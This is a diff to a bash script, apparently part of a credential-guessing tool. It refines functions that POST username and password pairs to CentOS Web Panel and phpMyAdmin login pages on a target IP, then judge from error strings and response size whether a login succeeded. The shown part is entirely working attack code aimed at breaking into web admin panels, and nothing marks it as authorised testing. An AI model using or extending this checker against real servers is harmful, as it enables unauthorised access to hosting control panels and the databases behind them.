@@ -23,7 +23,16 @@ check_cwp() {
     resp=$(curl -sk "https://${TARGET_IP}:${CWP_PORT}/login/index.php?acc=validate" \
         -d "username=${user}&password=${pass}&commit=Login" \
         --connect-timeout 5 --max-time 10 2>/dev/null)
+    # CWP returns just "failed" on wrong creds, dashboard/redirect on success
+    if [ "$resp" = "failed" ] || echo "$resp" | grep -qi "failed\|error\|invalid"; then
+        return 1
+    fi
     if echo "$resp" | grep -qi "success\|dashboard\|redirect\|welcome"; then
+        return 0
+    fi
+    # If response is large, likely a dashboard page (success)
+    local size=${#resp}
+    if [ "$size" -gt 500 ]; then
         return 0
     fi
     return 1
@@ -36,7 +45,14 @@ check_pma() {
     resp=$(curl -sk "https://${TARGET_IP}:${PMA_PORT}/pma/index.php" \
         -d "pma_username=${user}&pma_password=${pass}&server=1&lang=en" \
         --connect-timeout 5 --max-time 10 2>/dev/null)
-    if echo "$resp" | grep -qi "logout\|databases\|Browse\|logged_in"; then
+    # phpMyAdmin: login page has "login_form" and "Access denied" on wrong creds
+    # Successful login: no login_form, redirected to dashboard
+    if echo "$resp" | grep -qi "login_form\|Access denied\|Cannot log in"; then
+        return 1
+    fi
+    # If no login form and response is large, likely logged in
+    local size=${#resp}
+    if [ "$size" -gt 25000 ]; then
         return 0
     fi
     return 1
